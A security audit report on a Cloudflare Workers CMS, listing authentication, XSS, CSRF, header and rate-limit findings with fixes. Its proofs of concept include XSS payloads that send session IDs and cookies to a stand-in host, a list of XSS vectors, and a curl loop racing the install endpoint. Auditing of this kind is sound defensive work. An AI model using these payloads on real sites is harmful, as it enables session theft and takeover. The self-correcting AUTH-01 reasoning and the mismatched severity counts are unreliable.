# PHCloud CMS — Comprehensive Security Audit

**Audit Date:** 2026-07-16  
**Auditor:** Application Security Engineering  
**Scope:** Full source code review of PHCloud CMS  
**Files Reviewed:** 16 source files, configuration, and package manifest  

---

## Executive Summary

PHCloud CMS is a lightweight, single-admin CMS running on Cloudflare Workers. For a project of its scope, the security posture is **above average for a small CMS** — parameterized SQL queries are used consistently, session cookies have proper security flags, and the codebase demonstrates awareness of several common vulnerability classes.

However, the audit identified **2 critical**, **4 high**, **7 medium**, and **6 low/informational** findings. The most significant gaps are:

1. **No Content-Security-Policy or security headers** — the application ships with zero HTTP security headers
2. **No HTML sanitization on markdown output** — stored XSS is possible through post content (acknowledged in comments but still a real risk surface)
3. **Session ID leaked in JSON responses** — negates the `httpOnly` cookie protection
4. **No CSRF token protection** — `SameSite: Lax` provides partial mitigation but is not defense-in-depth
5. **No rate limiting on the install wizard** — brute force possible during initial setup
6. **PBKDF2 iteration count is 10K** — well below OWASP recommendation (600K for SHA-256)

The application gets many things right: all SQL is parameterized, session tokens use `crypto.randomUUID()`, the password comparison is constant-time, and the admin panel properly gates every route through `requireAuth()`.

---

## Findings by Category

---

### 1. Authentication & Session Management

#### FINDING AUTH-01: Session ID Returned in JSON Response (Defeats httpOnly Protection)
- **Severity:** HIGH
- **File:** `src/index.ts:149` and `src/index.ts:96`
- **CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

**Description:** Both the login and re-authentication paths return the session ID in the JSON response body alongside setting the httpOnly cookie:

```typescript
// Line 149 — new login
return c.json({ ok: true, sessionId });

// Line 96 — re-auth with existing session
return c.json({ ok: true, sessionId: existingSessionId });
```

The `httpOnly` cookie flag is designed to prevent JavaScript from reading the session token. By also returning it in JSON, any XSS vulnerability can trivially exfiltrate the session ID by reading `fetch('/api/auth/login',...).then(r=>r.json()).then(d=>exfiltrate(d.sessionId))`, completely bypassing the httpOnly protection.

**Proof of Concept:**
1. Attacker creates a post with content: `<img src=x onerror="fetch('/api/preview',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'test'})}).then(r=>r.json()).then(d=>{new Image().src='https://evil.com/?s='+d.sessionId})">`
2. Admin views the preview
3. Attacker's image onerror fires, making a request to the preview endpoint
4. The preview endpoint returns HTML — but if the attacker instead exploits the login flow or any endpoint that returns JSON with the session...

Actually, a more direct vector: If any XSS exists (and it does — see MDXSS-01), the attacker's script can call `fetch('/api/auth/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:'admin',password:'wrong'})})` and read the response — but this won't return a valid session ID for wrong credentials.

**Real exploitation:** If the attacker has the admin's credentials (via phishing, credential stuffing, etc.), they can call the login endpoint from XSS context and the JSON response contains the session ID, which can be exfiltrated even though the cookie is httpOnly.

**Recommended Fix:** Remove `sessionId` from JSON responses. The client doesn't need it — it's already in the cookie:

```typescript
// Line 149 — change to:
return c.json({ ok: true });

// Line 96 — change to:
return c.json({ ok: true });
```

---

#### FINDING AUTH-02: PBKDF2 Iteration Count Below OWASP Recommendation
- **Severity:** MEDIUM
- **File:** `src/cms/auth.ts:6`
- **CVSS:** 4.2 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:** The PBKDF2 implementation uses 10,000 iterations:

```typescript
const PBKDF2_ITERATIONS = 10_000;
```

OWASP 2023 guidelines recommend 600,000 iterations for PBKDF2-SHA256. The 10K figure is 60x lower than recommended. While the comment explains this is to stay under Workers' 10ms CPU limit, it means offline brute-force of a captured password hash is 60x faster than OWASP recommends.

For a single-admin CMS this is an acceptable trade-off, but it should be documented as a risk acceptance.

**Proof of Concept:** An attacker who gains read access to the D1 database (e.g., via a Cloudflare account compromise) can brute-force the admin password 60x faster than OWASP considers adequate.

**Recommended Fix:**
- Increase to the highest iteration count that stays within Workers CPU limits (~100ms is actually the free tier limit, not 10ms — verify)
- If Workers CPU truly limits to 10ms, consider migrating to `bcrypt` via a WASM library, or use Cloudflare Durable Objects for password verification
- At minimum, document this as an accepted risk

---

#### FINDING AUTH-03: No Session Regeneration After Authentication
- **Severity:** LOW
- **File:** `src/index.ts:88-98`
- **CVSS:** 3.1 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N)

**Description:** When a user logs in with an existing valid session (lines 88-98), the session ID is reused without regeneration. While session fixation is mitigated by the use of `crypto.randomUUID()` for initial session creation, best practice is to regenerate the session ID after any authentication event:

```typescript
// Lines 88-98 — existing session is reused, not regenerated
const existingSessionId = getCookie(c, SESSION_COOKIE);
if (existingSessionId) {
  const sessionOk = await c.env.CACHE.get(`session:${existingSessionId}`);
  if (sessionOk) {
    // ... validates password ...
    // Reuses existingSessionId — should generate a new one
    setCookie(c, SESSION_COOKIE, existingSessionId, { ... });
    return c.json({ ok: true, sessionId: existingSessionId });
  }
}
```

**Recommended Fix:** Always generate a new session ID on successful authentication and delete the old one from KV.

---

#### FINDING AUTH-04: No Account Lockout or Password Change Capability
- **Severity:** LOW
- **File:** `src/index.ts:80-150`
- **CVSS:** 2.4 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

**Description:** 
1. Rate limiting is IP-based (line 101: `cf-connecting-ip`). An attacker distributed across many IPs (botnet) can bypass the 5-attempt limit.
2. There is no endpoint to change the admin password after installation. If a password is compromised, the only option is to reinstall the CMS, losing all content.
3. There is no account lockout mechanism — only rate limiting by IP.

**Recommended Fix:**
- Add a password change endpoint (requires current password verification)
- Consider implementing account lockout after N failed attempts (not just IP-based rate limiting)
- Add a password reset flow using a time-limited token sent to a configured email

---

### 2. Authorization & Access Control

#### FINDING AUTHZ-01: All Admin Routes Properly Protected ✓
- **Severity:** INFO (PASS)

**Description:** Every admin route (`/admin/*` and `/api/admin/*`) calls `requireAuth(c)` before processing. No admin routes were found without authentication. This is correctly implemented.

#### FINDING AUTHZ-02: Preview Token Allows Unauthenticated Access to Unpublished Posts
- **Severity:** LOW
- **File:** `src/index.ts:1159-1189`
- **CVSS:** 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Description:** Unpublished posts can be accessed by anyone who knows the preview token:

```typescript
const previewToken = new URL(c.req.url).searchParams.get("preview");
if (previewToken) {
  post = await db
    .prepare("SELECT ... FROM posts WHERE slug = ? AND preview_token = ?")
    .bind(slug, previewToken)
    .first<...>();
}
```

The preview token is a `crypto.randomUUID()` (122 bits of entropy), making brute-force infeasible. However:
1. The token never expires
2. The token is never rotated
3. The token is visible in the admin UI's post editor (line 400 of admin.ts) and can be copied/shared
4. The token is returned in the PATCH response (line 332)

An attacker who obtains the token (e.g., from browser history, shared URLs, or logs) can access the unpublished post indefinitely.

**Recommended Fix:** 
- Add token expiry (e.g., 24 hours, regenerated on each use)
- Consider making preview access require authentication in addition to the token
- Clear the token after the post is published

---

### 3. Input Validation & Injection

#### FINDING INJ-01: All SQL Queries Parameterized ✓
- **Severity:** INFO (PASS)
- **File:** All D1 query locations in `src/index.ts`, `src/cms/d1.ts`, `src/plugins/tag-cloud.ts`

**Description:** Every database query in the codebase uses D1's `.bind()` parameterized queries. No string interpolation of user input into SQL was found. SQL injection is not possible.

#### FINDING INJ-02: No Input Length Validation on API Endpoints
- **Severity:** MEDIUM
- **File:** `src/index.ts:181-233` (and all other POST/PATCH endpoints)
- **CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Description:** No API endpoint validates input length. An attacker (or compromised admin account) can send arbitrarily large payloads:

```typescript
// Post creation — no validation on any field length
const body = await c.req.json<{ title?: string; slug?: string; content?: string; ... }>();
// title, slug, content, excerpt — all unlimited
```

The only size limit in the entire API is on image uploads (500KB). Posts, pages, settings, tags, and navigation items have no length restrictions.

**Impact:** An attacker with admin access could:
1. Store multi-megabyte post content, exhausting D1 storage (D1 has a 5GB limit per database)
2. Create extremely long slugs that could cause performance issues in URL routing
3. Cause Denial of Service through storage exhaustion

**Recommended Fix:** Add input length validation:
```typescript
if ((body.title ?? "").length > 500) return c.json({ error: "Title too long" }, 400);
if ((body.content ?? "").length > 1_000_000) return c.json({ error: "Content too long" }, 400);
if ((body.slug ?? "").length > 200) return c.json({ error: "Slug too long" }, 400);
```

---

#### FINDING INJ-03: Slug Validation Missing on API Input
- **Severity:** MEDIUM
- **File:** `src/index.ts:201-216`, `src/index.ts:1011-1034`
- **CVSS:** 5.4 (AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N)

**Description:** The client-side admin UI auto-generates slugs restricted to `[a-z0-9-]`, but the API accepts any string as a slug with no server-side validation:

```typescript
// Client-side (safe):
slugEl.value = titleEl.value.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');

// Server-side (no validation):
body.slug ?? ""  // Passed directly to SQL INSERT
```

A slug like `"><script>alert(1)</script>` would be stored in the database and rendered in HTML contexts. While most rendering uses `esc()`, the preview link in `editBody()` (admin.ts line 363-365, 400) does NOT escape the slug for the `href` attribute context:

```typescript
// admin.ts line 363-365 — slug used unescaped in URL construction
var previewLink = post.preview_token
    ? "/" + post.slug + "?preview=" + post.preview_token
    : "";

// Line 400 — injected into href attribute without escaping for HTML attribute context
'<a href="' + previewLink + '" target="_blank">...'
```

A slug containing `"` could break out of the `href` attribute and inject HTML attributes or tags.

**Recommended Fix:** Validate slugs server-side:
```typescript
if (body.slug && !/^[a-z0-9]+(?:-[a-z0-9]+)*$/.test(body.slug)) {
  return c.json({ error: "Slug must contain only lowercase letters, numbers, and hyphens" }, 400);
}
```

---

### 4. XSS / Stored Cross-Site Scripting

#### FINDING XSS-01: Markdown Rendered Without HTML Sanitization (Stored XSS)
- **Severity:** CRITICAL (for multi-admin/compromised account scenarios) / MEDIUM (single-admin trust model)
- **File:** `src/cms/markdown.ts:29-31`
- **CVSS:** 8.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) in multi-admin; 5.4 (AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N) in single-admin

**Description:** The `marked` library renders raw HTML by default. The markdown module only sanitizes link `href` attributes to strip `javascript:` and `data:` protocols:

```typescript
// markdown.ts line 19 — only link hrefs are sanitized
const safeHref = String(href ?? "").replace(/^(javascript|data):/i, "");
```

The following HTML constructs in markdown content will be rendered as-is:
- `<script>alert(1)</script>` — JavaScript execution
- `<img src=x onerror=alert(1)>` — Event handler XSS
- `<iframe src="https://evil.com/phish">` — Frame injection
- `<svg onload=alert(1)>` — SVG-based XSS
- `<details open ontoggle=alert(1)>` — HTML5 XSS
- `<math><mtext><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">` — Mutation XSS

The codebase comment (markdown.ts lines 3-8) acknowledges this is acceptable for a single-admin CMS where the admin is the only content author. However:
1. If the admin account is compromised, an attacker can inject persistent XSS affecting all visitors
2. If the CMS is used by multiple admins (shared credentials), one admin can XSS another
3. The XSS executes in the context of all site visitors, not just the admin

**Proof of Concept:**
1. Admin (or attacker with admin access) creates a post with content:
   ```markdown
   Normal content here

   <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
   ```
2. Any visitor to the post page triggers the onerror handler
3. The attacker receives the visitor's information (though httpOnly cookies limit what can be stolen)

**Recommended Fix:** Add DOMPurify or equivalent sanitization:
```typescript
import DOMPurify from "isomorphic-dompurify";

export function renderMarkdown(md: string): string {
  const raw = marked.parse(md, { async: false }) as string;
  return DOMPurify.sanitize(raw, {
    ALLOWED_TAGS: ['h1','h2','h3','h4','h5','h6','p','br','hr','ul','ol','li',
      'strong','em','code','pre','blockquote','a','img','table','thead','tbody',
      'tr','th','td','div','span','sup','sub','del','input'],
    ALLOWED_ATTR: ['href','src','alt','title','width','height','checked','type'],
  });
}
```

If DOMPurify is too heavy (~20KB), a minimal allowlist-based sanitizer would still be far better than nothing.

---

#### FINDING XSS-02: Markdown Preview Uses innerHTML Without Sanitization
- **Severity:** MEDIUM (Self-XSS in admin context)
- **File:** `src/admin.ts:228` and `src/admin.ts:416`
- **CVSS:** 5.4 (AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N)

**Description:** The markdown preview feature in the admin editor uses `innerHTML` to render the server-returned HTML:

```javascript
// admin.ts line 228
.then(function(data){pre.innerHTML=data.html})
```

This means any HTML in the markdown content will be executed in the preview pane. While this is expected behavior for a markdown preview, the content could contain:
- Scripts that execute in the admin's browser context
- Hidden iframes that make requests
- Keyloggers that capture admin input

Since only the admin can create this content, this is "self-XSS" — but if an attacker can inject content via another vector (e.g., a malicious plugin), this becomes exploitable.

**Recommended Fix:** Use `DOMPurify.sanitize(data.html)` before setting `innerHTML`, or use a shadow DOM iframe for preview isolation.

---

#### FINDING XSS-03: Site Logo URL Used in innerHTML Without Escaping
- **Severity:** LOW (Requires admin access to exploit)
- **File:** `src/admin.ts:918`
- **CVSS:** 3.4 (AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:N)

**Description:** The settings page constructs an `<img>` tag using the `site_logo` value from the database without HTML escaping:

```javascript
// admin.ts line 918
if(s.site_logo){
  document.getElementById('logoPreview').innerHTML=
    '<img src="'+s.site_logo+'" style="max-width:120px;max-height:60px;border:1px solid #e5e7eb;border-radius:4px" />'
}
```

If `site_logo` contains `" onerror="alert(1)`, this becomes:
```html
<img src="" onerror="alert(1)" style="...">
```

The `site_logo` is set via the admin settings API, so this requires admin access. It's self-XSS, but worth fixing as defense-in-depth.

**Recommended Fix:** Escape the value or use DOM manipulation:
```javascript
const img = document.createElement('img');
img.src = s.site_logo;
img.style.cssText = 'max-width:120px;max-height:60px;border:1px solid #e5e7eb;border-radius:4px';
document.getElementById('logoPreview').appendChild(img);
```

---

### 5. CSRF Protection

#### FINDING CSRF-01: No CSRF Token Protection
- **Severity:** MEDIUM
- **File:** All state-changing endpoints
- **CVSS:** 5.4 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N)

**Description:** No state-changing endpoint validates a CSRF token. The application relies solely on:
1. `SameSite: Lax` cookies — blocks cross-origin POST requests from including the cookie
2. `Content-Type: application/json` — prevents simple form-based CSRF (browser won't auto-submit JSON)

This provides reasonable protection against basic CSRF attacks, but:
- `SameSite: Lax` still allows the cookie on top-level GET navigations from other sites
- If any endpoint accepts `GET` for state changes (none currently), it would be fully vulnerable
- Older browsers may not enforce `SameSite`
- The protection depends on the browser correctly handling `Content-Type: application/json` (which all modern browsers do for CORS preflight)

**Proof of Concept (limited):**
An attacker cannot forge a cross-origin POST with `Content-Type: application/json` due to CORS preflight. However, if an endpoint ever accepts form-encoded data, or if `SameSite` is downgraded, CSRF becomes trivial.

**Recommended Fix:** Add CSRF token validation as defense-in-depth:
```typescript
// Generate token on login, store in session
const csrfToken = crypto.randomUUID();
await c.env.CACHE.put(`session:${sessionId}`, JSON.stringify({ adminId, csrfToken }), { ... });

// Validate on state-changing requests
app.post("/api/admin/*", async (c) => {
  const token = c.req.header("X-CSRF-Token");
  const sessionData = JSON.parse(await c.env.CACHE.get(`session:${sessionId}`) ?? "{}");
  if (token !== sessionData.csrfToken) return c.json({ error: "Invalid CSRF token" }, 403);
  // ...
});
```

---

### 6. Security Headers

#### FINDING HDR-01: No Security Headers Set
- **Severity:** HIGH
- **File:** `src/index.ts` (all routes)
- **CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:** The application sets zero HTTP security headers. The following critical headers are missing:

| Header | Risk of Absence |
|--------|----------------|
| `Content-Security-Policy` | XSS attacks are unrestricted — injected scripts can load from any domain, exfiltrate data anywhere |
| `X-Content-Type-Options: nosniff` | Browser may MIME-sniff responses, potentially executing content as scripts |
| `X-Frame-Options: DENY` | Admin panel can be embedded in an iframe on attacker-controlled site (Clickjacking) |
| `Strict-Transport-Security` | Users on HTTPS can be downgraded to HTTP via SSL stripping |
| `Referrer-Policy` | Full URLs (including query strings with preview tokens) may leak to third parties |
| `Permissions-Policy` | Browser features (camera, microphone, geolocation) are not restricted |

**Proof of Concept (Clickjacking):**
1. Attacker creates a page with `<iframe src="https://target.workers.dev/admin/settings">` wrapped in an invisible overlay
2. The admin visits the attacker's page while authenticated
3. The admin believes they're clicking something else but actually modifies site settings

**Recommended Fix:** Add a Hono middleware to set all security headers:

```typescript
app.use("*", async (c, next) => {
  await next();
  c.header("X-Content-Type-Options", "nosniff");
  c.header("X-Frame-Options", "DENY");
  c.header("Referrer-Policy", "strict-origin-when-cross-origin");
  c.header("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
  c.header("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  c.header("Content-Security-Policy", [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",  // Admin panel uses inline scripts
    "style-src 'self' 'unsafe-inline'",   // Inline styles used throughout
    "img-src 'self' data:",               // Data URLs for image paste
    "connect-src 'self'",
    "frame-ancestors 'none'",
  ].join("; "));
});
```

Note: `'unsafe-inline'` for scripts is needed because the admin panel uses extensive inline `<script>` blocks. A future hardening step would be to extract these to external files with nonces.

---

### 7. Data Protection

#### FINDING DATA-01: Session ID Leaked in Multiple JSON Responses
- **Severity:** HIGH
- **File:** `src/index.ts:96`, `src/index.ts:149`
- **CVSS:** 6.5 (See AUTH-01 above — this is the same finding, cross-referenced)

**Description:** See FINDING AUTH-01. The session ID is returned in JSON at both login endpoints, negating httpOnly cookie protection.

---

#### FINDING DATA-02: Preview Tokens Not Cleared After Publication
- **Severity:** LOW
- **File:** `src/index.ts:348-360`
- **CVSS:** 2.4 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

**Description:** When a post is published via the `/api/admin/posts/:id/publish` endpoint, the preview token is not cleared:

```typescript
// Line 352-356 — published flag is set, but preview_token persists
await c.env.DB.prepare(
  "UPDATE posts SET published=1, publish_at=NULL, updated_at=? WHERE id=?",
)
  .bind(now, c.req.param("id"))
  .run();
```

After publication, the post is accessible via its slug (no token needed), but the preview token remains valid as an alternate access path. This is a minor information leak — the token can be used to access the post even if the slug changes.

**Recommended Fix:** Clear the preview token when publishing:
```typescript
await c.env.DB.prepare(
  "UPDATE posts SET published=1, publish_at=NULL, preview_token=NULL, updated_at=? WHERE id=?",
)
  .bind(now, c.req.param("id"))
  .run();
```

---

#### FINDING DATA-03: No Password Change Endpoint
- **Severity:** LOW
- **File:** Application architecture
- **CVSS:** 3.3 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

**Description:** There is no endpoint to change the admin password after installation. If the password is compromised:
1. The attacker has persistent access until the CMS is reinstalled
2. The legitimate admin cannot rotate the password
3. No password history or expiration policy is enforceable

**Recommended Fix:** Add a password change endpoint at `/api/admin/change-password` that requires the current password and sets a new one.

---

### 8. File/Image Handling

#### FINDING IMG-01: MIME Type Trusted from Client Data URL
- **Severity:** MEDIUM
- **File:** `src/index.ts:681-687`
- **CVSS:** 5.4 (AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N)

**Description:** The image upload endpoint extracts the MIME type from the client-provided data URL:

```typescript
const match = data.match(/^data:(image\/\w+);base64,(.+)$/);
if (!match) return c.json({ error: "Invalid image data" }, 400);
const mime = match[1];
const ALLOWED_MIMES = ["image/png", "image/jpeg", "image/webp"];
if (!ALLOWED_MIMES.includes(mime)) { return c.json({ error: "..." }, 400); }
```

The MIME type is accepted from the client without verification against the actual file content. The allowlist (`png`, `jpeg`, `webp`) limits the risk significantly because:
1. SVG (which can contain JavaScript) is excluded
2. HTML, which would be served as `text/html`, is excluded
3. Browsers won't execute scripts in `image/*` content types

However, a polyglot file (a valid image file that also contains valid HTML/JavaScript when interpreted differently) could potentially be crafted. The risk is LOW because the Content-Type header would still be `image/*`, preventing browser script execution.

**Recommended Fix:** Optionally verify magic bytes (file signatures) to confirm the file matches the claimed MIME type:
```typescript
function verifyImageMagicBytes(data: Uint8Array, claimedMime: string): boolean {
  if (claimedMime === "image/png" && data[0] === 0x89 && data[1] === 0x50) return true;
  if (claimedMime === "image/jpeg" && data[0] === 0xFF && data[1] === 0xD8) return true;
  // WebP: RIFF header at bytes 0-3, WEBP at bytes 8-11
  if (claimedMime === "image/webp" && 
      data[0] === 0x52 && data[1] === 0x49 && data[2] === 0x46 && data[3] === 0x46 &&
      data[8] === 0x57 && data[9] === 0x45 && data[10] === 0x42 && data[11] === 0x50) return true;
  return false;
}
```

---

#### FINDING IMG-02: Images Stored in D1 as BLOB Without Size Limit in Schema
- **Severity:** LOW
- **File:** `src/cms/d1.ts:30-37`, `src/index.ts:689-691`
- **CVSS:** 2.5 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L)

**Description:** While the API limits uploads to ~500KB (line 689: `MAX_BASE64 = 700000`), the database schema has no size constraint on the `data BLOB` column. D1 has a maximum row size limit (approximately 1MB for SQLite), and D1 databases have a 5GB total storage limit. Without proper cleanup, accumulated images could exhaust storage.

**Recommended Fix:** This is already mitigated by the 500KB upload limit. Consider adding database-level monitoring for storage usage.

---

### 9. API Security

#### FINDING API-01: No Rate Limiting on Install Wizard
- **Severity:** HIGH
- **File:** `src/index.ts:378-459`
- **CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H)

**Description:** The `/api/install` endpoint has no rate limiting. During initial setup (before any admin account exists), an attacker can:

1. Brute-force the admin username (default is "admin" per line 417)
2. Submit the install form repeatedly to try different passwords
3. Race the legitimate installer to create their own admin account first

The install endpoint checks `isConfigured(db)` and returns 409 if already configured, but before configuration there is no protection.

Additionally, the `isConfigured()` check has a race condition: two simultaneous requests could both see `configured = false` and both proceed with installation. The second install would overwrite the first admin's password hash.

**Proof of Concept:**
```bash
# Before the site is configured, send parallel install requests
for i in {1..1000}; do
  curl -X POST https://target.workers.dev/api/install \
    -F "siteName=Hacked" \
    -F "adminUsername=admin" \
    -F "adminPassword=attempt$i" &
done
```

**Recommended Fix:**
1. Add rate limiting to the install endpoint (e.g., 1 attempt per 10 seconds)
2. Add a mutex/lock using KV to prevent concurrent installations:
```typescript
const lockKey = "install:lock";
const lock = await c.env.CACHE.get(lockKey);
if (lock) return c.json({ error: "Installation in progress" }, 429);
await c.env.CACHE.put(lockKey, "1", { expirationTtl: 60 });
```

---

#### FINDING API-02: Login Rate Limit Bypass via "unknown" IP
- **Severity:** MEDIUM
- **File:** `src/index.ts:101`
- **CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Description:** The rate limit key uses `cf-connecting-ip`:

```typescript
const ip = c.req.header("cf-connecting-ip") ?? "unknown";
const key = `login:${ip}`;
```

In local development (or if the Worker is accessed without Cloudflare proxy), `cf-connecting-ip` is absent, and the key becomes `login:unknown`. This means:
1. ALL dev users share one rate limit bucket
2. More importantly, in non-Cloudflare deployments, the rate limit is easily bypassed by sending requests without the header

An attacker accessing the Worker directly (e.g., via `*.workers.dev` subdomain) would get the `cf-connecting-ip` header from Cloudflare, so this is only an issue in non-standard deployments.

**Recommended Fix:** Fall back to a different identifier when `cf-connecting-ip` is unavailable, or require Cloudflare proxy access:
```typescript
const ip = c.req.header("cf-connecting-ip") 
  ?? c.req.header("x-forwarded-for")?.split(",")[0]?.trim()
  ?? "unknown";
```

---

### 10. Plugin System Security

#### FINDING PLG-01: Plugin Hook Pipeline Has No Sandboxing
- **Severity:** LOW (Plugins are trusted code)
- **File:** `src/cms/registry.ts:60-71`, `src/index.ts:1249`
- **CVSS:** 3.1 (AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N)

**Description:** Plugins registered in the hook pipeline:
1. Receive the full `DB` (D1Database) reference in the `render:body` payload (line 1249)
2. Can execute arbitrary SQL queries
3. Can modify HTML output without restriction
4. Errors are silently caught (line 64-66: `catch { // Skip failed hooks }`)

Since plugins are hardcoded in source code and compiled into the Worker bundle, this is an accepted design decision. However:
- A malicious plugin (added by a developer) could read/modify/delete any data in D1
- A buggy plugin's errors are silently swallowed, making debugging difficult
- The `DB` reference is exposed via the payload, which could be surprising to plugin authors

**Recommended Fix:** This is acceptable for the current architecture. Consider:
1. Logging plugin errors instead of silently catching them
2. Documenting that plugins have full DB access
3. In the future, if user-installable plugins are supported, implement a sandbox (e.g., Cloudflare Durable Objects, or restricted API)

---

#### FINDING PLG-02: Plugin Toggle API Can Insert Arbitrary Plugin IDs
- **Severity:** INFO
- **File:** `src/index.ts:623-625`
- **CVSS:** N/A

**Description:** The plugin toggle endpoint uses `INSERT OR REPLACE`:

```typescript
await c.env.DB.prepare("INSERT OR REPLACE INTO plugins (id, active) VALUES (?, ?)")
  .bind(id, active === true ? 1 : 0)
  .run();
```

An attacker with admin access could send `PATCH /api/admin/plugins/evil-plugin` with `{"active": true}` to insert an arbitrary row in the `plugins` table. However, since `initActivePlugins()` only iterates `AVAILABLE_PLUGINS`, the arbitrary entry has no effect. This is a minor data integrity issue, not a security vulnerability.

**Recommended Fix:** Validate that the plugin ID exists in `AVAILABLE_PLUGINS`:
```typescript
const validIds = AVAILABLE_PLUGINS.map(p => p.id);
if (!validIds.includes(id)) return c.json({ error: "Unknown plugin" }, 404);
```

---

### 11. Infrastructure / Cloudflare Workers

#### FINDING INFRA-01: D1 and KV IDs Committed to Repository
- **Severity:** INFO
- **File:** `wrangler.toml:12,19`
- **CVSS:** N/A

**Description:** The D1 database ID (`a2823457-ab83-40fd-8b29-0e5054caa728`) and KV namespace ID (`2d0d517b10eb4e66bdacfebd108e3898`) are committed to the repository. These are not secrets (they're needed for the Worker to connect to its services), but they identify the specific Cloudflare resources. Anyone with these IDs would need the API token to interact with them, so this is informational only.

**Note:** When users fork the repository, they replace these IDs with their own. The IDs in the committed repo are for the development instance only.

---

#### FINDING INFRA-02: Workers Dev Subdomain Enabled
- **Severity:** INFO
- **File:** `wrangler.toml:4`
- **CVSS:** N/A

**Description:** `workers_dev = true` means the Worker is accessible at `phcloudcms.<subdomain>.workers.dev`. This is expected for development and free-tier usage, but in production, it's recommended to:
1. Use a custom domain for the primary site
2. Disable `workers_dev` to prevent access via the workers.dev subdomain (which bypasses any domain-level access controls)

---

### 12. Onboarding Guard Bypass Analysis

#### FINDING ONBOARD-01: Onboarding Guard Bypass Analysis ✓
- **Severity:** INFO (PASS)

**Description:** The onboarding guard (`src/cms/middleware.ts:16-34`) correctly protects the application before installation:

```typescript
if (path === '/api/install' || path === '/health' || path.startsWith('/_next') || 
    path.match(/\.(css|js|png|ico|svg)$/)) {
  return next();
}
```

Path traversal attacks (`/../`) are neutralized by URL normalization in Cloudflare Workers. The regex matches only file extensions, not path components. No bypass was found.

The guard properly serves the install UI for all other paths when the system is not configured, preventing access to admin routes, API endpoints, and content before installation.

---

## Additional Observations

### OBS-01: Install Wizard Uses parseBody for Form Data
The install endpoint (`src/index.ts:388`) uses `c.req.parseBody()` for form data, while all other endpoints use `c.req.json()`. This is correct behavior — the install form submits as `multipart/form-data` via `FormData`, not JSON. No vulnerability here.

### OBS-02: Database Schema Migrations Are Idempotent
All schema statements use `CREATE TABLE IF NOT EXISTS` and `CREATE INDEX IF NOT EXISTS`, making them safe to re-run. ALTER TABLE statements are wrapped in try/catch to handle "column already exists." This is well-implemented.

### OBS-03: Constant-Time Password Comparison
The password verification (`src/cms/auth.ts:40-42`) correctly uses a constant-time comparison loop:
```typescript
let diff = 0;
for (let i = 0; i < actual.length; i++) diff |= actual[i] ^ expected[i];
return diff === 0;
```
This prevents timing attacks on password verification. Well-implemented.

### OBS-04: No Hardcoded Secrets
No API keys, tokens, or passwords are hardcoded in the source code. Environment variables are used for Cloudflare bindings via `wrangler.toml`. The `JWT_SECRET` pattern is not used — sessions are KV-based, not JWT-based, which is the correct approach for this architecture.

### OBS-05: Error Handling Does Not Leak Internals
The install error handler (line 450-458) catches exceptions and returns a generic message: `"Installation failed. Check your D1 and KV bindings."` Stack traces are not exposed to the client.

---

## Remediation Priority Matrix

| Priority | Finding | Severity | Effort | Impact |
|----------|---------|----------|--------|--------|
| **P0 — Immediate** | HDR-01: No security headers | HIGH | Low (1 hour) | Blocks Clickjacking, hardens XSS defense |
| **P0 — Immediate** | AUTH-01: Session ID in JSON response | HIGH | Low (5 min) | Prevents session theft via XSS |
| **P0 — Immediate** | API-01: No rate limiting on install | HIGH | Low (30 min) | Prevents brute-force during setup |
| **P1 — This Sprint** | XSS-01: No markdown HTML sanitization | CRITICAL/HIGH | Medium (2-4 hours) | Eliminates stored XSS vector |
| **P1 — This Sprint** | CSRF-01: No CSRF token protection | MEDIUM | Medium (2-3 hours) | Defense-in-depth for state changes |
| **P1 — This Sprint** | INJ-03: Slug validation missing | MEDIUM | Low (30 min) | Prevents HTML injection via slugs |
| **P2 — Next Sprint** | AUTH-02: PBKDF2 iterations too low | MEDIUM | Medium (1-2 hours) | Hardens password storage offline |
| **P2 — Next Sprint** | INJ-02: No input length validation | MEDIUM | Low (1 hour) | Prevents storage exhaustion |
| **P2 — Next Sprint** | XSS-02: Preview innerHTML unsanitized | MEDIUM | Low (30 min) | Hardens admin panel |
| **P3 — Backlog** | AUTH-03: No session regeneration | LOW | Low (30 min) | Session fixation defense-in-depth |
| **P3 — Backlog** | AUTH-04: No password change endpoint | LOW | Medium (1-2 hours) | Operational security improvement |
| **P3 — Backlog** | IMG-01: MIME type not verified server-side | MEDIUM | Low (1 hour) | Defense-in-depth for uploads |
| **P3 — Backlog** | DATA-02: Preview tokens not cleared | LOW | Low (10 min) | Token hygiene |
| **P3 — Backlog** | XSS-03: Logo URL in innerHTML | LOW | Low (10 min) | Admin self-XSS prevention |
| **P3 — Backlog** | PLG-01: Plugin errors silently swallowed | LOW | Low (30 min) | Observability improvement |
| **Informational** | PLG-02: Arbitrary plugin IDs | INFO | Low (10 min) | Data integrity |
